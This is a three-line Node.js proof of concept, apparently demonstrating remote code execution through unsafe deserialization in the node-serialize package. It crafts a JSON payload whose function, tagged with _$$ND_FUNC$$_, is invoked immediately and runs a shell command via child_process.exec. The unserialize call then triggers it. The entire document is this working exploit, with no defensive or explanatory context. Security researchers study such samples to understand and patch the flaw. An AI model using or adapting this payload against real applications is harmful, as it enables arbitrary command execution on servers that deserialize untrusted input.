var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);